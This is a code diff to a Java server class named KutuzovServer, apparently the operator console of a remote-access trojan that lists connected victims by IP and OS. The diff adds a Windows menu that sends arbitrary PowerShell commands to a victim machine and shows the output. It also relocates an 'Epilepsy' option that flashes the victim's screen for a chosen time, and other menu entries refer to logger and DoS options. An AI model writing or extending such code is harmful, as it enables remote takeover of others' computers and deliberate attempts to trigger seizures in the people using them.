@@ -10,6 +10,7 @@ import java.awt.*;
 import java.io.IOException;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
+import java.io.OptionalDataException;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.Locale;
@@ -74,7 +75,7 @@ public class KutuzovServer {
                 for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                     asyncRun(() -> {
                         try {
-                            entry.getValue().getSocket().sendUrgentData(0x01);
+                            entry.getValue().getOutput().writeObject(new SCKeepAlivePacket());
                         } catch (Exception e) {
                             clientManager.clients.remove(entry.getKey());
                             // pnl("Client disconnected(" + clientManager.clients.size() + "): " + entry.getKey());
@@ -220,6 +221,69 @@ public class KutuzovServer {
         }
     }
 
+    private void user_list_client_windows(Client client) {
+        clearConsole();
+        pnl("ID: " + client.getIdentifierName());
+        pnl("IP: " + client.getIp().substring(0, client.getIp().indexOf(':')));
+        pnl("OS: " + client.getOs());
+        pnl("LocalIP: " + client.getLocalIp());
+        pnl("Options: ");
+        pnl("  0) Go back");
+        pnl("  1) Epilepsy");
+        pnl("  2) Powershell");
+        pwl("Option: ");
+
+        String input = readLine();
+        int option = input.contentEquals("")?-1:Integer.parseInt(input);
+        switch (option) {
+            case 1: {
+                clearConsole();
+                pwl("Time(ms): ");
+                int time = Integer.parseInt(readLine());
+                try {
+                    client.getOutput().writeObject(new SCEpilepsyPacket(time));
+                } catch (IOException exception) {
+                    pnl("Failed to send epilepsy to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                    readLine();
+                }
+            } break;
+
+            case 2: {
+                clearConsole();
+                pwl("Command: ");
+                String command = readLine();
+                try {
+                    client.getOutput().writeObject(new SCPowershellCommandPacket(command));
+                    Packet packet = null;
+                    while(packet == null || !(packet instanceof CSPowershellResponsePacket)) {
+                        try {
+                            packet = (Packet) client.getInput().readObject();
+                        } catch (OptionalDataException exception) { } catch (IOException exception) {
+                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                            readLine();
+                            break;
+                        } catch (Exception exception) { }
+                    }
+
+                    if(packet == null)
+                        return;
+                    CSPowershellResponsePacket responsePacket = (CSPowershellResponsePacket)packet;
+                    String response = responsePacket.response;
+                    pnl("Response: \n  " + response);
+                    readLine();
+                } catch (IOException exception) {
+                    pnl("Failed to send powershell command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                    exception.printStackTrace();
+                    readLine();
+                }
+            } break;
+
+            case 0:
+                return;
+            default: break;
+        }
+    }
+
     private void user_list_client(Client client) {
         clearConsole();
         pnl("ID: " + client.getIdentifierName());
@@ -233,7 +297,6 @@ public class KutuzovServer {
         pnl("  3) Logger options");
         pnl("  4) Windows only options");
         pnl("  5) Beep");
-        pnl("  6) Epilepsy");
         pwl("Option: ");
 
         String input = readLine();
@@ -256,27 +319,19 @@ public class KutuzovServer {
                 }
             } break;
 
-            case 2: {
+            case 2:
                 user_list_client_dos_options(client);
-            } break;
+                break;
+
+            case 4:
+                user_list_client_windows(client);
+                break;
 
             case 5: {
                 try {
                     client.getOutput().writeObject(new SCBeepPacket());
                 } catch (IOException exception) {
                     pnl("Failed to send beep to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
-                    readLine();
-                }
-            } break;
-
-            case 6: {
-                clearConsole();
-                pwl("Time(ms): ");
-                int time = Integer.parseInt(readLine());
-                try {
-                    client.getOutput().writeObject(new SCEpilepsyPacket(time));
-                } catch (IOException exception) {
-                    pnl("Failed to send epilepsy to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                     readLine();
                 }
             } break;
